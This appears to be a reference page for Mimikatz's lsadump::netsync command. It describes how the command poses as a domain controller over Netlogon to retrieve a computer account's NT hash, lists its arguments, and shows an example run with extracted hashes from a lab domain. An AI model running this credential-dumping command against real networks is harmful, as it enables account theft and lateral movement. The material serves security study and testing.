# netsync

`lsadump::netsync` can be used to act as a Domain Controller on a target by doing a [Silver Ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets#silver-ticket). It then leverages the [Netlogon](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f) to request the RC4 key (i.e. NT hash) of the target computer account. It has the following command line arguments:

* `/dc`: The FQDN of the domain controller
* `/user`: the machine account of the domain controller
* `/ntlm`: the NT hash of the domain controller's machine account
* `/account`: the `SamAccountName` of the computer account to target

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "ntlm" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

```
mimikatz # lsadump::netsync /dc:dc.hacklab.local /user:dc$ /ntlm:5b7ba7b6131a4aab1bbd60ba1a810e53 /account:win7$
  Account: win7$
  NTLM   : 86e5ae81e1fcae2164a7c247af54e148
  NTLM-1 : 31d6cfe0d16ae931b73c59d7e0c089c0
```
